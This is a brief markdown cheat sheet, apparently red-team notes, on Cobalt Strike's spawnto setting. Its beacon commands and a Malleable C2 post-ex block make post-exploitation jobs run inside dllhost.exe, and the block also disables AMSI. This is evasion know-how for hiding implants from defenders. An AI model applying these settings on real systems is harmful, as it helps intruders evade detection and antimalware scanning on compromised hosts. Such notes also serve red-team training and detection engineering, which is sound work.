# SpawnTo

- Change the process for post-ex commands (the sysnative and syswow64 paths should be used rather than system32)

```
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe
```

*If we then use powerpick to get its own process name, it will return dllhost.*

- Change the process for psexec (the sysnative and syswow64 paths should be used rather than system32)

```
beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
```

- Malleable C2

```
post-ex {
        set amsi_disable "true";
        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```
